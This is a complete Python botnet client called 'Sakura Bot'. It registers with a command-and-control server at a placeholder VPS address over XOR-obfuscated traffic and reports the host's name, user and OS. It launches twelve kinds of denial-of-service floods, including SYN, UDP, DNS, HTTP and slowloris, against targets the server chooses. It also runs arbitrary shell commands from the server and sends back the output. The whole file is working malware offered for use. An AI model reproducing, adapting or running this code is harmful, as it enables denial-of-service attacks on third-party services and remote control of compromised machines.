#!/usr/bin/env python3
"""
Sakura Bot — connects to C2, executes commands
Run: python3 bot.py
"""

import socket
import threading
import time
import json
import random
import struct
import sys
import platform
import os
import subprocess
import base64
import hashlib
import string

# ─── CONFIG ───
C2_HOST = "YOUR_VPS_IP"
C2_PORT = 7778
RECONNECT_DELAY = 10
RECONNECT_JITTER = 5
XOR_KEY = b"sakura_c2_2024"

# ─── GLOBALS ───
attack_threads = []
stop_flag = threading.Event()
bot_id = None


# ─── ENCRYPTION ───

def xor_crypt(data: bytes, key: bytes = XOR_KEY) -> bytes:
    out = bytearray(len(data))
    kl = len(key)
    for i in range(len(data)):
        out[i] = data[i] ^ key[i % kl]
    return bytes(out)


def send_json(sock, data):
    raw = json.dumps(data).encode()
    encrypted = xor_crypt(raw)
    encoded = base64.b64encode(encrypted) + b"\n"
    sock.sendall(encoded)


def recv_json(sock):
    buf = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            return None
        buf += chunk
        if b"\n" in buf:
            line = buf.split(b"\n", 1)[0]
            decrypted = xor_crypt(base64.b64decode(line))
            return json.loads(decrypted.decode())


# ─── SYSTEM INFO ───

def get_sysinfo():
    info = {
        "type": "register",
        "os": f"{platform.system()} {platform.release()}",
        "hostname": socket.gethostname(),
        "username": os.environ.get("USER") or os.environ.get("USERNAME", "unknown"),
        "arch": platform.machine(),
        "pid": os.getpid(),
        "version": "2.0",
    }
    return info


# ═══════════════════════════════════════════════════════════════════
#  ATTACK METHODS
# ═══════════════════════════════════════════════════════════════════

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
]


def udp_flood(target, port, duration, tid):
    end = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sizes = [64, 128, 256, 512, 1024, 1400]

    while time.time() < end and not stop_flag.is_set():
        try:
            payload = random.randbytes(random.choice(sizes))
            sock.sendto(payload, (target, port))
        except Exception:
            pass
    sock.close()


def tcp_flood(target, port, duration, tid):
    end = time.time() + duration

    while time.time() < end and not stop_flag.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect_ex((target, port))
            s.close()
        except Exception:
            pass


def syn_flood(target, port, duration, tid):
    """SYN flood — rapid half-open connections."""
    end = time.time() + duration

    while time.time() < end and not stop_flag.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            try:
                s.connect_ex((target, port))
            except Exception:
                pass
            # immediately close = half-open
            s.close()
        except Exception:
            pass


def ack_flood(target, port, duration, tid):
    """ACK flood — push data after connect."""
    end = time.time() + duration
    payload = random.randbytes(1024)

    while time.time() < end and not stop_flag.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, port))
            for _ in range(10):
                if stop_flag.is_set():
                    break
                s.send(payload)
            s.close()
        except Exception:
            pass


def icmp_flood(target, port, duration, tid):
    """ICMP echo flood using raw socket or system ping."""
    end = time.time() + duration

    # try raw socket first (needs root/admin)
    try:
        if os.name == "nt":
            raise PermissionError
        raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        raw.settimeout(1)

        def make_icmp():
            # type=8 (echo request), code=0
            header = struct.pack("!BBHHH", 8, 0, 0, random.randint(0, 65535), 1)
            data = random.randbytes(56)
            # checksum
            pkt = header + data
            s = 0
            for i in range(0, len(pkt), 2):
                if i + 1 < len(pkt):
                    s += (pkt[i] << 8) + pkt[i+1]
                else:
                    s += pkt[i] << 8
            s = (s >> 16) + (s & 0xFFFF)
            s = ~s & 0xFFFF
            return struct.pack("!BBHHH", 8, 0, s, random.randint(0, 65535), 1) + data

        while time.time() < end and not stop_flag.is_set():
            try:
                raw.sendto(make_icmp(), (target, 0))
            except Exception:
                pass
        raw.close()
        return

    except (PermissionError, OSError):
        pass

    # fallback: system ping
    while time.time() < end and not stop_flag.is_set():
        try:
            if os.name == "nt":
                subprocess.run(["ping", "-n", "1", "-w", "500", target],
                               capture_output=True, timeout=2)
            else:
                subprocess.run(["ping", "-c", "1", "-W", "1", target],
                               capture_output=True, timeout=2)
        except Exception:
            pass


def gre_flood(target, port, duration, tid):
    """GRE protocol flood — encapsulated junk over raw socket or fallback to UDP."""
    end = time.time() + duration

    try:
        raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, 47)  # GRE = protocol 47
        while time.time() < end and not stop_flag.is_set():
            try:
                # GRE header: flags=0, protocol=0x0800 (IPv4)
                gre_header = struct.pack("!HH", 0, 0x0800)
                payload = random.randbytes(512)
                raw.sendto(gre_header + payload, (target, 0))
            except Exception:
                pass
        raw.close()
    except (PermissionError, OSError):
        # fallback UDP
        udp_flood(target, port or 47, duration, tid)


def dns_flood(target, port, duration, tid):
    """DNS query flood — send many DNS requests."""
    end = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    domains = [b"\x06google\x03com\x00", b"\x07example\x03com\x00",
               b"\x09microsoft\x03com\x00", b"\x06github\x03com\x00",
               b"\x07twitter\x03com\x00", b"\x08facebook\x03com\x00"]

    while time.time() < end and not stop_flag.is_set():
        try:
            # DNS query packet
            txid = struct.pack("!H", random.randint(0, 65535))
            flags = b"\x01\x00"  # standard query, recursion desired
            counts = struct.pack("!HHHH", 1, 0, 0, 0)
            domain = random.choice(domains)
            qtype = struct.pack("!HH", 1, 1)  # A record, IN class
            pkt = txid + flags + counts + domain + qtype
            sock.sendto(pkt, (target, port or 53))
        except Exception:
            pass
    sock.close()


def vse_flood(target, port, duration, tid):
    """Valve Source Engine query flood."""
    end = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # A2S_INFO query
    query = b"\xff\xff\xff\xff\x54Source Engine Query\x00"

    while time.time() < end and not stop_flag.is_set():
        try:
            sock.sendto(query, (target, port or 27015))
        except Exception:
            pass
    sock.close()


def http_flood(target, port, duration, tid):
    """HTTP GET flood with random headers."""
    end = time.time() + duration

    if target.startswith("http"):
        url = target
    else:
        url = f"http://{target}"

    host = url.split("//")[-1].split("/")[0].split(":")[0]
    parts = url.split("//")[-1].split("/", 1)
    path = "/" + parts[1] if len(parts) > 1 else "/"

    # resolve port from url
    host_part = url.split("//")[-1].split("/")[0]
    if ":" in host_part:
        rport = int(host_part.split(":")[1])
    elif url.startswith("https"):
        rport = 443
    else:
        rport = 80

    referers = [
        f"https://www.google.com/search?q={random.randint(1,999999)}",
        f"https://www.bing.com/search?q={random.randint(1,999999)}",
        "https://www.facebook.com/",
        "https://twitter.com/",
        "https://www.youtube.com/",
        "",
    ]

    while time.time() < end and not stop_flag.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, rport))
            ua = random.choice(USER_AGENTS)
            ref = random.choice(referers)
            rand_path = f"{path}?{''.join(random.choices(string.ascii_lowercase, k=8))}={random.randint(1,999999)}"
            req = (
                f"GET {rand_path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                f"Accept-Language: en-US,en;q=0.9\r\n"
                f"Accept-Encoding: gzip, deflate\r\n"
                f"Connection: keep-alive\r\n"
                f"Cache-Control: no-cache\r\n"
                f"Pragma: no-cache\r\n"
            )
            if ref:
                req += f"Referer: {ref}\r\n"
            req += "\r\n"
            s.send(req.encode())
            try:
                s.recv(1024)
            except Exception:
                pass
            s.close()
        except Exception:
            pass


def http_post_flood(target, port, duration, tid):
    """HTTP POST flood with random form data."""
    end = time.time() + duration

    if target.startswith("http"):
        url = target
    else:
        url = f"http://{target}"

    host = url.split("//")[-1].split("/")[0].split(":")[0]
    parts = url.split("//")[-1].split("/", 1)
    path = "/" + parts[1] if len(parts) > 1 else "/"

    host_part = url.split("//")[-1].split("/")[0]
    if ":" in host_part:
        rport = int(host_part.split(":")[1])
    else:
        rport = 80

    while time.time() < end and not stop_flag.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, rport))
            body = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(64, 2048)))
            ua = random.choice(USER_AGENTS)
            req = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
                f"{body}"
            )
            s.send(req.encode())
            try:
                s.recv(1024)
            except Exception:
                pass
            s.close()
        except Exception:
            pass


def http_head_flood(target, port, duration, tid):
    """HTTP HEAD flood — lightweight requests."""
    end = time.time() + duration

    if target.startswith("http"):
        url = target
    else:
        url = f"http://{target}"

    host = url.split("//")[-1].split("/")[0].split(":")[0]
    host_part = url.split("//")[-1].split("/")[0]
    rport = int(host_part.split(":")[1]) if ":" in host_part else 80

    while time.time() < end and not stop_flag.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, rport))
            ua = random.choice(USER_AGENTS)
            req = f"HEAD / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nConnection: close\r\n\r\n"
            s.send(req.encode())
            s.close()
        except Exception:
            pass


def slowloris_flood(target, port, duration, tid):
    """Slowloris — hold connections with partial headers."""
    end = time.time() + duration
    socks = []

    for _ in range(200):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            ua = random.choice(USER_AGENTS)
            s.send(f"GET /?{random.randint(0,99999)} HTTP/1.1\r\n".encode())
            s.send(f"User-Agent: {ua}\r\n".encode())
            s.send(f"Accept-Language: en-US,en;q=0.9\r\n".encode())
            socks.append(s)
        except Exception:
            pass

    while time.time() < end and not stop_flag.is_set():
        for s in list(socks):
            try:
                s.send(f"X-a: {random.randint(1, 99999)}\r\n".encode())
            except Exception:
                socks.remove(s)
                try:
                    ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    ns.settimeout(4)
                    ns.connect((target, port))
                    ns.send(f"GET /?{random.randint(0,99999)} HTTP/1.1\r\n".encode())
                    socks.append(ns)
                except Exception:
                    pass
        time.sleep(10)

    for s in socks:
        try:
            s.close()
        except Exception:
            pass


METHODS = {
    "udp":       udp_flood,
    "tcp":       tcp_flood,
    "syn":       syn_flood,
    "ack":       ack_flood,
    "icmp":      icmp_flood,
    "gre":       gre_flood,
    "dns":       dns_flood,
    "vse":       vse_flood,
    "http":      http_flood,
    "post":      http_post_flood,
    "head":      http_head_flood,
    "slowloris": slowloris_flood,
}


# ─── ATTACK RUNNER ───

def run_attack(method, target, port, duration, threads):
    global attack_threads
    stop_flag.clear()

    func = METHODS.get(method)
    if not func:
        return

    for i in range(threads):
        t = threading.Thread(target=func, args=(target, port, duration, i), daemon=True)
        t.start()
        attack_threads.append(t)


def stop_attacks():
    stop_flag.set()
    time.sleep(0.5)
    for t in attack_threads:
        t.join(timeout=2)
    attack_threads.clear()
    stop_flag.clear()


# ─── SHELL EXECUTION ───

def run_shell(sock, cmd):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30, shell=True)
        output = (r.stdout + r.stderr).strip()
        if not output:
            output = "(no output)"
        # truncate
        output = output[:8192]
    except subprocess.TimeoutExpired:
        output = "(timeout)"
    except Exception as e:
        output = f"(error: {e})"

    send_json(sock, {"type": "shell_result", "output": output})


# ─── MAIN LOOP ───

def connect_loop():
    global bot_id

    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(60)
            sock.connect((C2_HOST, C2_PORT))

            # register
            send_json(sock, get_sysinfo())

            # wait for ack
            ack = recv_json(sock)
            if ack and ack.get("type") == "registered":
                bot_id = ack.get("id", "?")
            else:
                raise ConnectionError("Registration failed")

            print(f"[+] Connected to {C2_HOST}:{C2_PORT} as {bot_id}")

            while True:
                data = recv_json(sock)
                if data is None:
                    break

                msg_type = data.get("type", "")

                if msg_type == "ping":
                    send_json(sock, {"type": "pong"})

                elif msg_type == "attack":
                    method = data["method"]
                    target = data["target"]
                    port = data.get("port", 80)
                    duration = data.get("duration", 30)
                    threads = data.get("threads", 1)
                    print(f"[*] Attack: {method} -> {target}:{port} for {duration}s x{threads}")

                    # stop any running first
                    stop_attacks()
                    run_attack(method, target, port, duration, threads)
                    send_json(sock, {"type": "status", "msg": f"attacking {target} ({method})"})

                elif msg_type == "stop":
                    print("[*] Stopping attacks")
                    stop_attacks()
                    send_json(sock, {"type": "status", "msg": "attacks stopped"})

                elif msg_type == "shell":
                    cmd = data.get("cmd", "")
                    if cmd:
                        threading.Thread(target=run_shell, args=(sock, cmd), daemon=True).start()

                elif msg_type == "broadcast":
                    print(f"[C2] {data.get('msg', '')}")

        except Exception as e:
            print(f"[-] Connection failed: {e}")

        try:
            sock.close()
        except Exception:
            pass

        stop_attacks()
        delay = RECONNECT_DELAY + random.uniform(0, RECONNECT_JITTER)
        print(f"[*] Reconnecting in {delay:.0f}s...")
        time.sleep(delay)


if __name__ == "__main__":
    if C2_HOST == "YOUR_VPS_IP":
        print("[!] Edit bot.py: set C2_HOST to your VPS IP.")
        sys.exit(1)
    connect_loop()
